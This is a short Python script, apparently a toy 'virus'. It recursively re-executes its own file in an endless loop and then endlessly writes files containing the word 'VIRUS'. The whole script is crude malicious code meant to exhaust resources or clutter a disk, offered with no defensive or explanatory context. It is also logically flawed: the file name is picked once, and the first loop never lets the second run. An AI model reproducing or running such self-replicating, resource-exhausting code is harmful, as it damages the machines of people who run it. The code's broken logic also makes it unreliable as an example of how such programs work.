import random
import string

while 1:
    exec(open('main.py').read())

length_of_string = random.choice(range(1, 100))
random_string = "".join(random.choice(string.ascii_letters) for i in range(length_of_string))

while 1:
    f = open(random_string, "w+")
    f.write("VIRUS")
    f.close()
